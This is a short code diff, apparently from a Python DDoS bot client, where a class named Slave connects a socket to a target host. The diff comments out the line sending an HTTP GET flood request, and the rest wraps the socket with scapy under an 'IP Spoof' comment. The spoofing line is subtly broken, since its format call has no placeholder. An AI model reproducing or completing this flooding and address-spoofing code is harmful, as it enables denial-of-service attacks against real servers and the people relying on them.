@@ -47,7 +47,7 @@ class Slave():
         try:
             self.ddos = socket(AF_INET, SOCK_STREAM)
             self.ddos.connect((host, port))
-            self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
+            #self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
             #IP Spoof
             newSocket = scapy.StreamSocket(self.ddos)
             src = "10.1.1.3".format(random.randint(0,255))
